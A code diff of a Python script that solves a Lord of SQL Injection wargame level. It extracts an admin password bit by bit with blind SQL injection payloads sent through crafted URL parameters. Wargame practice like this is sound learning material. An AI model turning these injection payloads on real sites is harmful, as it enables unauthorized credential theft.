@@ -1,52 +1,67 @@
-# -*- coding : UTF-8 -*-
-from requests import get
-import string
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+import requests
+from sys import stdout
 
+query = 0
 print("#### Lord of SQL Injection - Orc ####\n")
 
-# URL을 설정합니다.
 url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php"
 
-#쿠키를 세팅합니다. 반드시 당신의 쿠키로 설정해야 합니다.
-cookies = dict(PHPSESSID="irol41srevag2a8osqleail8f2")
-abc = string.digits + string.ascii_letters                  #ASCII의 문자를 저장합니다. (브루트포스할 때 필요)
-result = ""
 
-#pw의 길이를 게싱합니다.
-for i in range(1,20):
-    param = "?pw=1' or id='admin' and LENGTH(pw)=" + str(i) + "%23"
-    new_url = url + param
-    r = get(new_url, cookies=cookies)
+# session = "gequo9hff2f19sjmieftjnuf50"
+session = raw_input("Input your LOS session : ")
 
-    if r.text.find("<h2>Hello admin</h2>") > 0:
-        idLength = i + 1
-        print("pw의 길이는 " + str(i) + " 입니다.")
+headers = {
+    'Cookie': 'PHPSESSID={0}'.format(session)
+}
+
+password = ""
+
+# get the length of password
+for i in range(100):
+    param = "?pw=' or id='admin' and length(pw)={0}%23".format(i)
+
+    content = requests.get(url + param, headers=headers).text
+    query += 1
+
+    if content.find("Hello admin") > -1:
+        length = i
+        print "[*] The length of admin password : {0}".format(i)
         break
 
 
-#얻은 정보를 바탕으로 블라인드 SQL Injection을 진행합니다.
 print("\n\n#### Starting Blind SQL Injection ####\n")
-for i in range(1, idLength):
-    for a in abc:
-        param = "?pw=1' or id='admin' and ASCII(SUBSTR(pw, " + str(i) + ", 1))=" + str(ord(a)) + "%23"
-        new_url = url + param
-        r = get(new_url, cookies=cookies)
+#  substr(lpad(bin(ascii(substr('asdf',1,1))),7,0),1,1)
 
-        if r.text.find("<h2>Hello admin</h2>") > 0:
-            print(str(i) + "번 째 pw의 값은 '" + a + "' 입니다. ")
-            result += a
-            break
+print "[*] the password : ",
+stdout.flush()
 
-    if i == 1 and result == "":
-        print("FAIL")
-        exit(0)
+for i in range(1, length+1):
 
-    if i == idLength-1:
-        print("\n\n#### RESULT ####")
-        print("pw : " + result)
+    binary = ''
+    for j in range(0, 8):
+        param = "?pw=' or id='admin' and (select substr(lpad(bin(ascii(substr(pw,{0},1))),7,0),{1},1)=1)%23".format(i, j)
+        content = requests.get(url + param, headers=headers).text
+        query += 1
 
-url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=" + result
-r = get(url, cookies=cookies)
+        if content.find("Hello admin") > 0:
+            binary += '1'
+        else:
+            binary += '0'
 
-if r.text.find("<h2>ORC Clear!</h2>") > 0:
-    print("축하합니다! Orc를 클리어했습니다.")
+    password += chr(int(binary, 2))
+
+    print chr(int(binary, 2)),
+    stdout.flush()
+
+print "\n[*] the password : ", password
+
+
+url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw={0}".format(password)
+content = requests.get(url + param, headers=headers).content
+
+if content.find("<h2>ORC Clear!</h2>") > 0:
+    print "ORC Clear!"
+
+print "[+] total query : {0}".format(query)
